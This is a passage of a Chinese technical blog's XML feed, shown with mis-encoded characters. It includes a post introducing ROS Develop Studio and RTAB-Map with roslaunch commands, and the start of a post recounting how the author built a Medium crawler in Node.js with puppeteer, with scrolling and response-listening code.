é—œæ–¼ä½œè€…ï¼š@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººè·Ÿé›»è…¦è¦–è¦ºæœ‰å°‘è¨±ç ”ç©¶ï¼Œæœ€è¿‘åœ¨å­¸ç¿’çœ‹æ¸…äº‹ç‰©çš„æœ¬è³ªèˆ‡æ”¹é€²è‡ªå·±çš„è§€å¿µ
]]></content>
      <tags>
        <tag>Robotics</tag>
        <tag>ROS</tag>
        <tag>SLAM</tag>
        <tag>LSD SLAM</tag>
      </tags>
  </entry>
  <entry>
    <title>æ·±å…¥å­¸ç¿’ LSD-SLAM ç•ªå¤–ç¯‡ - RDS X RTAB-Map</title>
    <url>/2017/06/10/lsd-slam-side-1/</url>
    <content><![CDATA[å‰è¨€å› ç‚ºå‰é™£å­å› ç·£éš›æœƒç™¼ç¾äº† Robot Ignite Academy è·Ÿ ROS Develop Studioï¼ˆRDSï¼‰ï¼Œå¾ˆå¸Œæœ›å¯ä»¥æ¨è–¦çµ¦æˆ‘å€‘çš„è®€è€…ã€‚æ‰€ä»¥é€™æœŸå°ˆæ¬„æˆ‘å»¶ä¼¸ä¸€ä¸‹ LSD SLAM ç³»åˆ—ï¼Œå…ˆè·Ÿå¤§å®¶ä»‹ç´¹é€™å€‹å¾ˆé…·çš„å­¸ç¿’è³‡æºï¼Œä¸¦ä»‹ç´¹è·Ÿ LSD SLAM ç›®çš„ç›¸ä¼¼çš„ RTAB-Map æ¼”ç®—æ³•ã€‚
ç‚ºä»€éº¼è¦ä»‹ç´¹ RDSï¼Ÿå­¸ç¿’çš„æ–¹æ³•æœ‰è¨±å¤šç¨®ï¼Œå€Ÿå¼•ç”¨é€™ä¸€é€±å¾ˆç´…çš„ è‹±æ–‡å­¸ç¿’ repository çš„åœ–ï¼š

å­¸ç¿’è¶Šé›£çš„æ±è¥¿ï¼Œè¶Šä¸å®¹æ˜“åªé å–®ä¸€å­¸ç¿’è³‡æºå°±å­¸é€šé€ï¼Œèˆ‰ä¾‹ä¾†èªªï¼Œä½ å¾ˆé›£åªçœ‹æ–‡ç« ä¸å‹•æ‰‹å¯¦ä½œå°±çœŸçš„å­¸æœƒå¯«ç¨‹å¼ã€‚
åŒæ¨£åœ°ï¼Œå­¸ç¿’æ©Ÿå™¨äººå¦‚æœä¸ç¢°æ©Ÿå™¨äººï¼Œå¾ˆé›£çœŸæ­£å¼„æ‡‚æ©Ÿå™¨äººã€‚Gazebo çš„å‡ºç¾ç¢ºå¯¦å¹«åŠ©è¨±å¤šç„¡æ³•è¼•æ˜“å–å¾—æ©Ÿå™¨äººçš„äººï¼Œä½¿ç”¨æ¨¡æ“¬æ©Ÿå™¨äººä¾†å­¸ç¿’ã€‚ä½†æ˜¯ï¼Œå¦‚æœå° Linux ä¸ç†Ÿï¼Œå¾ˆå¯èƒ½åœ¨ç’°å¢ƒå®‰è£çš„éšæ®µå°±æœƒç¢°åˆ°éšœç¤™å°è‡´å­¸ç¿’ä¸­æ–·ã€‚
ä»Šå¤©ä»‹ç´¹çš„ RDS å°±å¯ä»¥å…ˆæ’é™¤å­¸æœŸåˆæœŸçš„ç’°å¢ƒè¨­å®šå•é¡Œï¼Œç›´æ¥ä½¿ç”¨ Web UI ä¾†å‘ˆç¾æ¨¡æ“¬å™¨ã€command windowã€æª”æ¡ˆç³»çµ±ï¼Œè®“ä½¿ç”¨è€…å¯ä»¥ç›´æ¥åˆ‡å…¥æ©Ÿå™¨äººçš„é–‹ç™¼ã€‚é™¤æ­¤ä¹‹å¤–ï¼ŒRobot Ignite Academy ç›´æ¥æä¾›äº†è·Ÿ RDS æ•´åˆåœ¨ä¸€èµ·çš„ç·šä¸Šèª²ç¨‹ï¼Œç­‰æ–¼æ˜¯ä½ å®Œå…¨ä¸éœ€è¦æœ‰ä»»ä½•åŸºç¤æº–å‚™ï¼Œä½ åªè¦æœ‰ä¸€å€‹ç€è¦½å™¨ï¼Œå°±å¯ä»¥é€£ä¸Š RDS é–‹å§‹å­¸ç¿’æ©Ÿå™¨äººã€‚
å°±æ˜¯å› ç‚ºä»–å€‘æä¾›äº†ä¸€å€‹å¾ˆæ–¹ä¾¿çš„å­¸ç¿’ç’°å¢ƒï¼Œæ‰€ä»¥æˆ‘æ‰æƒ³å¯«ä¸€ç¯‡æ–‡ç« ä¾†è·Ÿå¤§å®¶åˆ†äº«ï¼Œæˆ–è¨±å¯ä»¥å¹«åŠ©æ›´å¤šäººæ›´å®¹æ˜“æ„Ÿå—åˆ°å­¸ç¿’æ©Ÿå™¨äººçš„æ»‹å‘³ã€‚
RDS ç°¡ä»‹RDS æ˜¯ The construct é€™é–“å…¬å¸é–‹ç™¼å‡ºä¾†çš„å·¥å…·ï¼Œä¸‹åœ–æ˜¯æˆ‘å»ä¸Šä»–å€‘çš„èª²ç¨‹æˆªçš„åœ–ï¼Œä½ å¯ä»¥çœ‹å¾—å‡ºä¾†ï¼Œæœ€å·¦é‚Šæ˜¯èª²ç¨‹å…§å®¹ï¼Œå³é‚Šæœ‰æª”æ¡ˆç³»çµ±çš„ UIã€æ¨¡æ“¬å™¨ç•«é¢ï¼Œä¸‹æ–¹é‚„æœ‰ command window ä»¥ä¾›è¼¸å…¥æŒ‡ä»¤ã€‚è¦–çª—çš„å®‰æ’ä¹Ÿæœ‰å¹¾ç¨®é…ç½®æ–¹å¼ï¼Œå¯ä»¥éš¨è‡ªå·±å–œæ­¡å»ç·¨æ’ã€‚

æƒ³è¦ä½¿ç”¨ RViz ç­‰å·¥å…·ä¹Ÿä¸ç”¨ç·Šå¼µï¼Œå¯ä»¥é¡å¤–é–‹ä¸€å€‹åˆ†é é¡¯ç¤ºæ¡Œé¢ï¼Œå€‹äººè¦ºå¾—æ‡‰æœ‰ç›¡æœ‰äº†ã€‚

Robot Ignite Academyçœ‹å®Œä¸Šé¢çš„ä»‹ç´¹ï¼Œä½ å¯èƒ½æœƒå•ï¼Œç¾åœ¨æœ‰å“ªäº›æ±è¥¿å¯ä»¥ç”¨ RDS å­¸ï¼Ÿ
åŸºæœ¬ä¸Šéƒ½åœ¨é€™å€‹æˆªåœ–è£¡äº†ï¼Œæ˜¯èªªæœªä¾†ä¹Ÿé‚„æœƒå†å¢åŠ ï¼Œæ‰€ä»¥æœ‰èˆˆè¶£çš„è®€è€…å¯ä»¥æŒçºŒé—œæ³¨ã€‚

RTAB Map ç°¡ä»‹RTAB-Map (Real-Time Appearance-Based Mapping) æ˜¯ä¸€ç¨® RGB-D SLAM çš„æ–¹æ³•ï¼Œè·Ÿ LSD SLAM çš„ç›®çš„å¾ˆåƒï¼Œéƒ½æ˜¯ç‚ºäº†å»ºå‡º 3D åœ°åœ–ä¸¦å®šä½æ„Ÿæ¸¬å™¨ä½ç½®ï¼Œæœ€ä¸»è¦çš„å·®åˆ¥åœ¨æ–¼ï¼ŒLSD SLAM ä½¿ç”¨çš„æ„Ÿæ¸¬å™¨æ˜¯ä¸€å€‹ RGB cameraï¼Œè€Œ RTAB-Map ä½¿ç”¨çš„æ˜¯ Kinect é€™ç¨® RGB-D cameraã€‚
é€™å€‹ç•ªå¤–ç¯‡æ²’æœ‰è¦è©³ç´°ä»‹ç´¹é€™å€‹æ¼”ç®—æ³•çš„è¨­è¨ˆæ¦‚å¿µï¼Œæ‰€ä»¥å°±ç›´æ¥å¾ä½¿ç”¨çš„è§’åº¦å‡ºç™¼å•¦ã€‚
å› ç‚º RTAB-Map æœ¬èº«æ˜¯ä¸€ç¨® SLAM çš„æ¼”ç®—æ³•ï¼Œæœ‰äººå¯«äº† rtabmap_ros é€™å€‹ packageï¼Œè¦åœ¨ ROS ä¸­è·‘èµ· RTAB-Map ç›´æ¥é é€™å€‹ package å°±è¡Œäº†ã€‚ä¸éè¦ä½¿ç”¨ï¼Œé‚„æ˜¯éœ€è¦ä¸€äº›åŸºæœ¬çš„èªçŸ¥ï¼Œæ¥ä¸‹ä¾†å°±ç°¡çŸ­åœ°è·Ÿå¤§å®¶ä»‹ç´¹ä¸€ä¸‹ï¼
RTAB-Map åŸºæœ¬ä¸Šæœ‰å…©å€‹æ¨¡å¼ - Mapping mode è·Ÿ Localization modeï¼ŒMapping mode é¡§åæ€ç¾©å°±æ˜¯å»ºåœ°åœ–ï¼ŒRTAB Map æœƒæŠŠåœ°åœ–è³‡æ–™ï¼ˆä¾‹å¦‚å½±åƒã€2D åœ°åœ–ã€3D åœ°åœ–ï¼‰å­˜èµ·ä¾†ï¼Œå¯ä»¥è¦‹ä¸‹åœ–ã€‚

Localization mode å°±æ˜¯æ ¹æ“šå·²ç¶“å»ºå¥½çš„åœ°åœ–è³‡æ–™åº«ï¼Œä¾†å®šä½æ©Ÿå™¨äººç¾åœ¨çš„ä½ç½®ï¼Œä¸€æ—¦å¯ä»¥å°‡æ©Ÿå™¨äººæ„Ÿæ¸¬åˆ°çš„è³‡æ–™å°æ‡‰åˆ°åœ°åœ–ï¼Œå°±ç®—æ˜¯å®šä½æˆåŠŸã€‚
å¯¦éš›æ“ä½œ RTAB-Mapå¦‚æœä½ å»è©¦ç©çœ‹çœ‹ä»–å€‘çš„èª²ç¨‹ï¼Œç›´æ¥ç”¨ä¸‹é¢å¹¾å€‹æŒ‡ä»¤å°±å¯ä»¥æº–å‚™å¥½æ‰€æœ‰æ±è¥¿ï¼Œç„¶å¾Œç”¨ä½ çš„éµç›¤æ“æ§ turtlebot å°±å¯ä»¥é–‹å§‹å»ºåœ°åœ–äº†ã€‚
roslaunch rtabmap_ros rtabmap.launch rtabmap_args:=&quot;--delete_db_on_start&quot;roslaunch rtabmap_ros demo_turtlebot_rviz.launchroslaunch turtlebot_teleop keyboard_teleop.launch

å¦‚æœä½ æœ‰è‡ªå·±çš„ RGB-D sensor æƒ³è¦ç©ï¼Œé‚£ä½ å°±ç›´æ¥åƒè€ƒå®‰è£æ–¹æ³•è·ŸRGB-D Hand-Held Mapping With a Kinectä¹Ÿå¯ä»¥å¾ˆå¿«ä¸Šæ‰‹ï¼
ç„¶å¾Œä½ å¯ä»¥ç”¨é€™ä¸€å€‹æŒ‡ä»¤å•Ÿå‹• Localization modeï¼Œé‚£æ©Ÿå™¨äººæ”¶åˆ°çš„æ„Ÿæ¸¬å™¨è³‡æ–™å°±æœƒè¢«æ‹¿ä¾†è·Ÿåœ°åœ–æ¯”å°ï¼š
roslaunch rtabmap_ros rtabmap.launch localization:=true

å“ˆä¸éä¹‹æ‰€ä»¥èƒ½é€™éº¼å®¹æ˜“å°±å•Ÿå‹•ï¼Œä¹Ÿæ˜¯å› ç‚º launch æª”æŠŠé€™å€‹é»‘ç›’å­åŒ…å¾—å¾ˆå¥½ï¼Œä½ å¯ä»¥å»çœ‹çœ‹ rtabmap.launchã€‚
ç¸½çµé€™é€±è·Ÿå¤§å®¶ä»‹ç´¹äº† Robot Ignite Academyã€ROS Develop Studio è·Ÿ rtabmap_rosï¼Œå¸Œæœ›å¤§å®¶å­¸ç¿’æ„‰å¿«ï¼
å»¶ä¼¸é–±è®€
[ROS tutorial] RTAB-Map in ROS 101
RTAB-Map å®˜æ–¹ tutorial

]]></content>
      <tags>
        <tag>Robotics</tag>
        <tag>ROS</tag>
        <tag>SLAM</tag>
        <tag>LSD SLAM</tag>
        <tag>RTAB-Map</tag>
      </tags>
  </entry>
  <entry>
    <title>Medium çˆ¬èŸ²é€²åŒ–å²</title>
    <url>/2019/07/13/medium-crawler/</url>
    <content><![CDATA[å‰è¨€å‰å¹¾å¤©çš„æ™‚å€™æˆ‘åœ¨ Medium ä¸Šç™¼äº†é€™ç¯‡æ–‡ï¼šMedium ä¸­æ–‡å¯«ä½œè€…è¿½è¹¤äººæ•¸æ’åèˆ‡ä¸å°ˆæ¥­æ•¸æ“šåˆ†æï¼Œå…§æ–‡æ˜¯æˆ‘ç”¨ Node.js å¯«äº†ä¸€å€‹ç°¡å–®çš„ Medium çˆ¬èŸ²ä¹‹å¾Œæ•´ç†å‡ºä¾†çš„æ•¸æ“šã€‚
åœ¨åŸæœ¬é‚£ç¯‡æ–‡ç« è£¡é¢æœ‰ç°¡å–®æåˆ°çˆ¬èŸ²çš„è³‡æ–™ä¾†æºï¼Œä½†æ˜¯å°æŠ€è¡“çš„éƒ¨åˆ†æ²’æœ‰å¤ªå¤šè‘—å¢¨ã€‚äº‹å¯¦ä¸Šï¼Œåœ¨å¯« Medium çˆ¬èŸ²çš„æ™‚å€™å…¶å¯¦è¸©äº†ä¸€äº›å‘ï¼Œèˆ‡å…¶æ•™å¤§å®¶å¯«ä¸€å€‹ Medium çˆ¬èŸ²ï¼Œä¸å¦‚è®“å¤§å®¶è·Ÿæˆ‘ä¸€èµ·èµ°éé€™äº›å‘ï¼Œç›¡å¯èƒ½åœ°é‚„åŸæˆ‘ç•¶åˆåœ¨å¯«é€™å€‹çˆ¬èŸ²æ™‚ç¢°åˆ°çš„éšœç¤™ä»¥åŠè§£æ±ºæ–¹æ³•ï¼Œæˆ‘è¦ºå¾—é€™æ¨£æœƒæ›´æœ‰è¶£ä¸€é»ã€‚
å› æ­¤ï¼Œé€™ç¯‡å°±æ˜¯ç”¨ä¾†è¨˜éŒ„æˆ‘å¯«é€™å€‹ Medium çˆ¬èŸ²çš„ç¶“éï¼Œå…¶ä¸­ä¹Ÿæœƒæœ‰é»æ•™å­¸çš„æˆä»½åœ¨ï¼Œæ‰€ä»¥çœ‹å®Œä¹‹å¾Œä½ æ‡‰è©²ä¹Ÿèƒ½å¤ å¯«å‡ºä¸€å€‹é¡ä¼¼çš„çˆ¬èŸ²ï¼Œæˆ–è‡³å°‘ä½ çœ‹åˆ° source code çš„æ™‚å€™ä¸æœƒä¸€é ­éœ§æ°´ã€‚
é›–ç„¶èªªæœ€å¾Œå¯«å‡ºä¾†çš„æ˜¯é€™å€‹è·Ÿä½¿ç”¨è€…è³‡æ–™æœ‰é—œçš„çˆ¬èŸ²ï¼Œä½†æˆ‘ä¸€é–‹å§‹å…¶å¯¦æ˜¯å…ˆå¾æ–‡ç« åˆ—è¡¨é–‹å§‹çš„ï¼Œå› ç‚ºé‚£æ™‚å€™å‰›å¥½æœ‰ä¸€å€‹éœ€æ±‚ï¼Œæƒ³è¦æŠŠè‡ªå·±çš„æ–‡ç« å…¨éƒ¨çˆ¬ä¸‹ä¾†ã€‚
æœƒæœ‰é€™å€‹éœ€æ±‚æ˜¯å› ç‚º Medium å…§å»ºçš„åŠŸèƒ½å…¶å¯¦æ»¿çˆ›çš„ï¼Œä½ å¾ˆé›£æ‰¾åˆ°ä¸€å€‹ä½œè€… po éçš„æ‰€æœ‰æ–‡ç« ï¼Œæˆ–è€…æ˜¯èªªå¾ˆé›£ä¸€ç›®ç­ç„¶ã€‚æ‰€ä»¥æ—©æœŸçš„æ–‡ç« é™¤äº†é€é Google ä»¥å¤–ï¼Œæ˜¯å¾ˆé›£è¢«æ‰¾åˆ°çš„ã€‚
æ‰€ä»¥æˆ‘å¾Œä¾†å°±æ‰‹å‹•åšäº†ä¸€å€‹æ–‡ç« çš„ç´¢å¼•ï¼Œè‡ªå·±æ•´ç†äº†ä»¥å‰ç™¼éçš„æ‰€æœ‰æ–‡ç« ã€‚ä½†æ˜¯èº«ç‚ºå·¥ç¨‹å¸«ï¼Œé€™æ˜æ˜å°±æ˜¯ä¸€ä»¶å¯ä»¥å¯«ç¨‹å¼ä¾†åšçš„äº‹å•Šï¼æ‰€ä»¥æƒ³å˜—è©¦çœ‹çœ‹èƒ½ä¸èƒ½å…ˆå¯«ä¸€å€‹æ–‡ç« åˆ—è¡¨çš„çˆ¬èŸ²ã€‚
ç¬¬ä¸€æ¬¡å˜—è©¦ï¼šå°‹æ‰¾è³‡æ–™ä¾†æºå°æˆ‘ä¾†èªªï¼Œçˆ¬èŸ²çš„ç¬¬ä¸€æ­¥ä¹Ÿæ˜¯æœ€å›°é›£çš„ä¸€æ­¥å°±æ˜¯æ‰¾åˆ°è³‡æ–™ä¾†æºã€‚åªè¦é€™ä¸€æ­¥å®Œæˆäº†ï¼Œå…¶ä»–çš„ç›¸æ¯”ä¹‹ä¸‹éƒ½æ¯”è¼ƒç°¡å–®ã€‚
å¦‚æœèƒ½æ‹¿åˆ° Medium çš„ API é‚£ç•¶ç„¶æ˜¯æœ€å¥½çš„ã€‚è‹¥æ˜¯æ²’æœ‰çš„è©±ï¼Œå°±å¿…é ˆç”¨ puppeteer ä¹‹é¡çš„æ±è¥¿å»çˆ¬ HTML ç„¶å¾Œè‡ªå·± parse äº†ã€‚
åœ¨ Medium çš„æ–‡ç« åˆ—è¡¨é‚£é‚Šæ²å‹•ä¸€ä¸‹ä¸¦ä¸”æ‰“é–‹ devtoolï¼Œå¯ä»¥çœ‹åˆ° medium å¾Œé¢æ˜¯ç”¨ GraphQLï¼š

é€™å€‹å°±éº»ç…©äº†â€¦æˆ‘å° GraphQL ä¸å¤ªç†Ÿï¼Œè¦èŠ±æ™‚é–“å»ç ”ç©¶ä¸€ä¸‹å®ƒçš„è³‡æ–™çµæ§‹ï¼Œæ„Ÿè¦ºè¦èŠ±ä¸å°‘æ™‚é–“ï¼Œæ–¼æ˜¯é‚£æ™‚æˆ‘å°±æš«æ™‚å…ˆæ”¾æ£„é€™æ¢è·¯ï¼Œæ±ºå®šä¾†è©¦è©¦çœ‹ç”¨ puppeteerã€‚
ç¬¬äºŒæ¬¡å˜—è©¦ï¼špuppeteerå¦‚æœä½ ä¸çŸ¥é“ä»€éº¼æ˜¯ puppeteerï¼Œæˆ‘åœ¨é€™é‚Šç°¡å–®ä»‹ç´¹ä¸€ä¸‹ã€‚ä½ å¯ä»¥æƒ³æˆ puppeteer æœƒè‡ªå‹•å¹«ä½ æ‰“é–‹ä¸€å€‹ç€è¦½å™¨ï¼Œä½ å¯ä»¥å¯«ç¨‹å¼å»æ“æ§é€™å€‹ç€è¦½å™¨ã€‚ä¾‹å¦‚èªªæˆ‘è¦æ‰“é–‹ä¸€å€‹é é¢ä¸¦ä¸”åœ¨é€™é é¢ä¸ŠåŸ·è¡Œ JS ç­‰ç­‰ï¼Œæ‰€ä»¥ä½¿ç”¨ puppeteer çš„è©±ï¼Œçˆ¬èŸ²çš„åŸç†å°±æ˜¯æ‰“é–‹æŸå€‹é é¢ï¼ŒåŸ·è¡Œä¸€æ®µ JS æ‹¿åˆ°é é¢ä¸Šçš„è³‡æ–™ã€‚
puppeteer ç”¨èµ·ä¾†å¾ˆç°¡å–®ï¼Œåªè¦æ‰¾ä¸€ä¸‹ç¾æˆçš„ç¯„ä¾‹çœ‹ä¸€ä¸‹èªæ³•ï¼Œæ”¹ä¸€æ”¹å°±å¯ä»¥ç›´æ¥æ‹¿ä¾†ç”¨äº†ã€‚ç¨å¾®ç ”ç©¶äº†ä¸€ä¸‹ HTML çµæ§‹ä¹‹å¾Œï¼Œå¯ä»¥å¯«å‡ºä¸‹é¢çš„ç¨‹å¼ç¢¼ï¼š
const puppeteer = require(&#x27;puppeteer&#x27;)  async function main() &#123;  const username = &#x27;hulitw&#x27;  const url = &#x27;https://medium.com/@&#x27; + username    const browser = await puppeteer.launch(&#123;    headless: true  &#125;)    // é€ è¨ªé é¢  const page = await browser.newPage()  await page.goto(url, &#123;    waitUntil: &#x27;domcontentloaded&#x27;  &#125;)    // åŸ·è¡Œæº–å‚™å¥½çš„ script ä¸¦å›å‚³è³‡æ–™   const data = await page.evaluate(mediumParser)  console.log(data)    await page.close()  await browser.close()&#125;  function mediumParser() &#123;    // selector æ˜¯é€éè§€å¯Ÿè€Œå¾—ä¾†çš„  const elements = document.querySelectorAll(&#x27;section &gt; div:nth-child(2) &gt; div &gt; div&#x27;)  const result = []  for (let i = 0; i &lt; elements.length; i++) &#123;    const h1 = elements[i].querySelector(&#x27;h1&#x27;)    const a = elements[i].querySelectorAll(&#x27;a&#x27;)    if (h1) &#123;      result.push(&#123;        title: h1.innerText,        link: a[3].href      &#125;)    &#125;  &#125;  return result&#125;  main()

åªè¦è§€å¯Ÿå‡º HTML èˆ‡ CSS çš„è¦å‰‡ä¹‹å¾Œï¼Œå°±å¯ä»¥å–å¾—æƒ³æ‹¿çš„è³‡æ–™ã€‚ä½† Medium ä¸å¥½çˆ¬æ˜¯å› ç‚ºåœ¨ class name çš„éƒ¨åˆ†æœ‰ä½¿ç”¨ functional CSSï¼Œè€Œä¸” class çš„å‘½åéƒ½æœ‰ç¶“éè™•ç†ï¼Œçœ‹èµ·ä¾†æ˜¯ç”¨ç¨‹å¼è‡ªå‹•å»è·‘çš„ï¼Œæ‰€ä»¥åªè¦ Medium ä¸€æ›´æ–°ï¼Œå…ƒç´ çš„å‘½åæ‡‰è©²æœƒä¸å¤ªä¸€æ¨£ã€‚
æ‰€ä»¥æœ€å¾Œåªèƒ½å¾ HTML çš„çµæ§‹ä¸‹æ‰‹ï¼Œå»æŠŠæ–‡ç« çµ¦æŠ“å‡ºä¾†ã€‚
è§£æ±ºäº†é€™å€‹å•é¡Œä¹‹å¾Œï¼Œé‚„æœ‰ä¸€å€‹å•é¡Œï¼Œé‚£å°±æ˜¯ç„¡é™æ²å‹•ã€‚Medium è·Ÿå¾ˆå¤šç¶²é ä¸€æ¨£ï¼Œè¦ä¸€ç›´å¾€ä¸‹æ»‘æ‰æœƒè¼‰å…¥æ–°æ–‡ç« ï¼Œè€Œé€™é‚Šå¿…é ˆè§€å¯Ÿçš„è¦å¾‹æ˜¯æ»‘åˆ°ä»€éº¼æ™‚å€™æ‰è¦åœæ­¢ã€‚
è§€å¯Ÿä¹‹å¾Œç™¼ç¾ç•¶ç™¼è¡¨éçš„æ–‡ç« è¼‰å…¥å®Œä»¥å¾Œï¼Œæ‰æœƒé¡¯ç¤º Highlighted by xxx é€™å€‹å€å¡Šï¼Œæ‰€ä»¥å¯ä»¥ç”¨é€™å€‹å…ƒç´ æœ‰æ²’æœ‰å‡ºç¾ç•¶ä½œçµ‚æ­¢æ¢ä»¶ã€‚
æ¥è‘—å¯ä»¥å¯«ä¸€æ®µç¨‹å¼ç¢¼ï¼Œè®“é é¢ä¸æ–·å¾€ä¸‹æ²å‹•ç›´åˆ°è¼‰å…¥æ‰€æœ‰æ–‡ç« ç‚ºæ­¢ï¼š
/*  è¦ç”¨çš„è©±å°±æ˜¯ï¼š await scroll(page)*/  function getArticlesCount() &#123;  const elements = document.querySelectorAll(&#x27;section &gt; div:nth-child(2) &gt; div &gt; div&#x27;)  return elements.length&#125;  async function scroll(page) &#123;  await page.evaluate(&#x27;window.scrollTo(0, document.body.scrollHeight)&#x27;)  try &#123;      // çµ‚æ­¢æ¢ä»¶    await page.waitForSelector(&#x27;h4 ~ p&#x27;, &#123;      timeout: 1000    &#125;)  &#125; catch(err) &#123;      // å°å‡ºç›®å‰æŠ“åˆ°çš„æ–‡ç« æ•¸ç›®    const count = await page.evaluate(getArticlesCount);    console.log(`Fetching... $&#123;count&#125; articles`)      // ç¹¼çºŒå¾€ä¸‹æ²å‹•    await scroll(page);  &#125;&#125;

ç‚ºäº†åœ¨ console ä¸Šè®“æˆ‘èƒ½çœ‹åˆ°ç¾åœ¨çš„é€²åº¦ï¼ˆå¯ä»¥ç¢ºèªç¨‹å¼æ˜¯ä¸æ˜¯æœ‰ bugï¼‰ï¼Œé‚„åŠ äº†ä¸€æ®µæ˜¯æ¯ä¸€æ¬¡æ²å‹•éƒ½æœƒå°å‡ºç¾åœ¨ç•«é¢ä¸Šæœ‰çš„æ–‡ç« æ•¸é‡ã€‚
åšåˆ°é€™é‚Šï¼Œå°±å¯ä»¥æŠ“åˆ°ä½¿ç”¨è€…æ‰€æœ‰çš„æ–‡ç« æ¨™é¡Œä»¥åŠé€£çµäº†ã€‚
é‚£ç™¼æ–‡æ—¥æœŸå‘¢ï¼Ÿä¹Ÿæ‹¿å¾—åˆ°å—ï¼Ÿ
æ‹¿å¾—åˆ°ï¼Œä½†æ˜¯éº»ç…©å¾ˆå¤šã€‚çœ‹çœ‹ä¸‹é¢çš„ Medium æˆªåœ–å°±çŸ¥é“äº†ï¼š

å¦‚æœæ˜¯ä»Šå¹´ï¼ˆ2019ï¼‰çš„æ–‡ç« ï¼Œå°±ä¸æœƒé¡¯ç¤ºå¹´ä»½ï¼Œå¦å‰‡çš„è©±å°±æœƒé¡¯ç¤ºå‡ºç™¼æ–‡å¹´ä»½ã€‚æ‰€ä»¥é€™é‚Šè¦å†ç¶“éç‰¹æ®Šçš„åˆ¤æ–·è™•ç†ï¼Œè€Œä¸”åªæ‹¿å¾—åˆ°æ—¥æœŸï¼Œæ‹¿ä¸åˆ°è©³ç´°ç™¼æ–‡æ™‚é–“ã€‚
åšåˆ°é€™é‚Šï¼Œæˆ‘å°±æ‡¶å¾—å†ç¹¼çºŒä¸‹å»äº†ã€‚æƒ³èªªæœ‰å¾ˆå¤šçœ‰çœ‰è§’è§’è¦è™•ç†ï¼Œè€Œä¸”æŠ“åˆ°çš„è³‡æ–™æœ‰é™ï¼Œé‚„ä¸å¦‚è½‰å»ç ”ç©¶ API æ¯”è¼ƒå¯¦åœ¨ã€‚
ç¬¬ä¸‰æ¬¡å˜—è©¦ï¼špuppeteer + APIå‰é¢å·²ç¶“èªªéæˆ‘é‚£æ™‚å° GraphQL API ä¸ç†Ÿï¼Œæ‰€ä»¥æš«æ™‚æ”¾æ£„äº†ã€‚ä½†æ˜¯å˜—è©¦äº† puppeteer ä¹‹å¾Œï¼Œåè€Œè®“æˆ‘æœ‰äº†æ–°çš„æ€è·¯ã€‚
åœ¨ puppeteer è£¡é¢ä½ å¯ä»¥åŠ ä¸Šç›£è½ network response çš„äº‹ä»¶ï¼Œè€Œé é¢åœ¨è¼‰å…¥æ–‡ç« çš„æ™‚å€™ï¼Œä¸€å®šæœƒå‘¼å« API å»æ‹¿æ–‡ç« ã€‚é€™æ¨£å­äº‹æƒ…ä¸å°±å¥½è¾¦å¤šäº†å—ï¼Ÿæˆ‘ä¸ç”¨è‡ªå·±ç ”ç©¶æ€éº¼ call APIï¼Œæˆ‘è®“é é¢è‡ªå·±å» call APIï¼Œæˆ‘è‡ªå·±åªè¦ç›£è½ responseï¼Œç ”ç©¶ä¸€ä¸‹ response çš„æ ¼å¼å°±è¡Œäº†ï¼
ç¨‹å¼ç¢¼å¤§æ¦‚æ˜¯é•·é€™æ¨£çš„ï¼š
const apiResponses = []  page.on(&#x27;response&#x27;, async (response) =&gt; &#123;    if (response._url.indexOf(&#x27;graphql&#x27;) &lt; 0) return    const json = await response.json()    try &#123;      const post = parsePosts(json)      apiResponses.push(...post)    &#125; catch (err) &#123;    &#125;&#125;)  function parsePosts(json) &#123;  const result = []  try &#123;      // ç ”ç©¶åˆ°ä¸€åŠæ²’åšå®Œ    const streams = json.data.user.profileStreamConnection.stream    for (stream of streams) &#123;      if (stream.itemType.__typename === &#x27;StreamItemCompressedPostList&#x27;) &#123;        &#125;    &#125;  &#125; catch (err) &#123;    &#125;&#125;

æ¯æ¬¡æœ‰æ–°çš„ response é€²ä¾†å°±å¯ä»¥è§£æä¸€ä¸‹ä¸¦ä¸Ÿåˆ° array è£¡é¢ï¼Œæœ€å¾Œæ‹¿åˆ°çš„å°±æœƒæ˜¯å®Œæ•´çš„å¾ API å‚³ä¾†çš„è³‡æ–™ã€‚
ä½†å¾Œä¾†æˆ‘ç™¼ç¾é€™æ¢è·¯ä¹Ÿè¡Œä¸é€šã€‚
ç‚ºä»€éº¼å‘¢ï¼Ÿå› ç‚ºé é¢åœ¨ç¬¬ä¸€æ¬¡è¼‰å…¥çš„æ™‚å€™ï¼Œå¾ Server å›å‚³çš„ HTML å°±å·²ç¶“æœ‰å‰å¹¾ç­†æ–‡ç« çš„è³‡æ–™äº†ï¼Œå¾€ä¸‹æ²å‹•çš„æ™‚å€™æ‰æ˜¯ä½¿ç”¨ ajax ä¾†è¼‰å…¥æ–°çš„æ–‡ç« ã€‚æ„æ€æ˜¯èªªï¼Œå¦‚æœæˆ‘æƒ³é ç›£è½ ajax response çš„æ–¹å¼æ‹¿åˆ°æ‰€æœ‰æ–‡ç« çš„è³‡æ–™æ˜¯æ²’è¾¦æ³•çš„ï¼Œå‰å¹¾ç­†æ˜¯æ‹¿ä¸åˆ°çš„ã€‚
åšåˆ°é€™é‚Šçš„æ™‚å€™æˆ‘æœ‰é»å¿ƒç°æ„å†·ï¼Œæƒ³èªªèŠ±äº†å…©å¤©å¯«å‡ºä¸€å€‹ä¸èƒ½ç”¨çš„æ±è¥¿ã€‚æŠ“å–æ–‡ç« åˆ—è¡¨çš„éƒ¨åˆ†åšåˆ°é€™æˆ‘å°±æ”¾æ£„äº†ï¼Œæ‡¶å¾—ç¹¼çºŒèŠ±æ™‚é–“å»ç ”ç©¶ï¼Œä¸¦ä¸”æŠŠå¿ƒåŠ›è½‰å‘æˆ‘çœŸæ­£æƒ³æŠ“çš„æ±è¥¿ã€‚
æœ€å‰é¢æåˆ°çš„æŠ“æ–‡ç« åˆ—è¡¨çš„éœ€æ±‚å…¶å¯¦æ˜¯çªç„¶è¹¦å‡ºä¾†çš„ï¼Œåœ¨é€™ä¹‹å‰æˆ‘æœ‰æ›´æƒ³æŠ“çš„æ±è¥¿ï¼šfollowerï¼Œæˆ‘æƒ³çµ±è¨ˆè‡ºç£å¯«ä½œè€…çš„ follower äººæ•¸ï¼Œç„¶å¾Œçœ‹çœ‹è‡ªå·±å¯ä»¥æ’åˆ°ç¬¬å¹¾åï¼ˆæ»¿è¶³ä¸€ä¸‹è™›æ¦®å¿ƒï¼‰ã€‚
